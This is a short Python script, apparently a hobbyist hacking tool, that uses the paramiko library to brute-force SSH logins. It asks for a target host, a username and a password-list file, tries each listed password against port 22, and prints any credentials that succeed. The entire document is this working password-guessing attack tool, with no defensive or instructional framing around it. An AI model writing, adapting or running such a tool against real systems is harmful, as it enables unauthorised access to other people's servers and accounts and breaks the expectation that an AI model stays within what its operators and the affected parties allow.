import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0
host = input("[+] Enter target: ")
username = input("[+] SSH Username: ")
input_file = input("[+] Password File: ")
print("\n")

def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code

if os.path.exists(input_file) == False:
    print("[!] That password file/path does not exist")
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try: 
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(("[+] Found credentials: " + username + ", " + password), "green"))
                break
            elif response == 1:
                print("[-] Incorrect Login for " + password)
            elif response == 2:
                print("[!] Couldn't Connect")
                sys.exit(1)
        except Exception as e:
            print(e)
            pass

            